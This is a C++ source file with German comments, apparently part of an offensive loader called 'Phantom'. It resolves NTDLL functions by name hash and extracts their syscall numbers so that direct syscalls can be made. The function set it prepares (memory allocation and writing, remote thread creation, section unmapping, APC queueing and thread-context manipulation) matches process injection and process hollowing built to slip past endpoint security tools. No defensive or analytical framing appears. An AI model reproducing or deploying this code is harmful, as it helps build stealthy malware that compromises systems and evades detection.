#include "syscalls.h"
#include "util.h"
#include <stdexcept>

// Diese Funktion sucht den Prolog einer NTDLL-Funktion nach dem Muster
// mov r10, rcx
// mov eax, <syscall_id>
// und extrahiert die Syscall-ID. Dies ist weitaus robuster als ein statischer Offset.
static bool getSyscallId(PVOID pFunction, DWORD& outSyscallId) {
    BYTE* pByte = (BYTE*)pFunction;

    // Wir suchen nach "mov eax, XXh" (B8 XX XX 00 00)
    for (int i = 0; i < 32; ++i) {
        // Find "mov eax, ..."
        if (pByte[i] == 0xB8) {
            outSyscallId = *(DWORD*)(pByte + i + 1);
            return true;
        }
    }
    return false;
}


bool InitializeSyscalls(HMODULE hNtdll) {
    if (!hNtdll) return false;

    // Hashes für alle benötigten Funktionen
    constexpr DWORD ntAllocateVirtualMemory_hash = Phantom::Util::a_hash("NtAllocateVirtualMemory");
    constexpr DWORD ntWriteVirtualMemory_hash = Phantom::Util::a_hash("NtWriteVirtualMemory");
    constexpr DWORD ntCreateThreadEx_hash = Phantom::Util::a_hash("NtCreateThreadEx");
    constexpr DWORD ntUnmapViewOfSection_hash = Phantom::Util::a_hash("NtUnmapViewOfSection");
    constexpr DWORD ntQueryInformationProcess_hash = Phantom::Util::a_hash("NtQueryInformationProcess");
    constexpr DWORD ntQueueApcThread_hash = Phantom::Util::a_hash("NtQueueApcThread");
    constexpr DWORD ntGetContextThread_hash = Phantom::Util::a_hash("NtGetContextThread");
    constexpr DWORD ntSetContextThread_hash = Phantom::Util::a_hash("NtSetContextThread");
    constexpr DWORD ntResumeThread_hash = Phantom::Util::a_hash("NtResumeThread");
    
    // Funktionszeiger auflösen
    PVOID pNtAllocateVirtualMemory = Phantom::Util::getProcAddressByHash(hNtdll, ntAllocateVirtualMemory_hash);
    PVOID pNtWriteVirtualMemory = Phantom::Util::getProcAddressByHash(hNtdll, ntWriteVirtualMemory_hash);
    PVOID pNtCreateThreadEx = Phantom::Util::getProcAddressByHash(hNtdll, ntCreateThreadEx_hash);
    PVOID pNtUnmapViewOfSection = Phantom::Util::getProcAddressByHash(hNtdll, ntUnmapViewOfSection_hash);
    PVOID pNtQueryInformationProcess = Phantom::Util::getProcAddressByHash(hNtdll, ntQueryInformationProcess_hash);
    PVOID pNtQueueApcThread = Phantom::Util::getProcAddressByHash(hNtdll, ntQueueApcThread_hash);
    PVOID pNtGetContextThread = Phantom::Util::getProcAddressByHash(hNtdll, ntGetContextThread_hash);
    PVOID pNtSetContextThread = Phantom::Util::getProcAddressByHash(hNtdll, ntSetContextThread_hash);
    PVOID pNtResumeThread = Phantom::Util::getProcAddressByHash(hNtdll, ntResumeThread_hash);
    
    // Syscall-IDs extrahieren und in globale Strukturen schreiben
    if (!getSyscallId(pNtAllocateVirtualMemory, g_sNtAllocateVirtualMemory.syscall_id)) return false;
    if (!getSyscallId(pNtWriteVirtualMemory, g_sNtWriteVirtualMemory.syscall_id)) return false;
    if (!getSyscallId(pNtCreateThreadEx, g_sNtCreateThreadEx.syscall_id)) return false;
    if (!getSyscallId(pNtUnmapViewOfSection, g_sNtUnmapViewOfSection.syscall_id)) return false;
    if (!getSyscallId(pNtQueryInformationProcess, g_sNtQueryInformationProcess.syscall_id)) return false;
    if (!getSyscallId(pNtQueueApcThread, g_sNtQueueApcThread.syscall_id)) return false;
    if (!getSyscallId(pNtGetContextThread, g_sNtGetContextThread.syscall_id)) return false;
    if (!getSyscallId(pNtSetContextThread, g_sNtSetContextThread.syscall_id)) return false;
    if (!getSyscallId(pNtResumeThread, g_sNtResumeThread.syscall_id)) return false;

    return true;
} 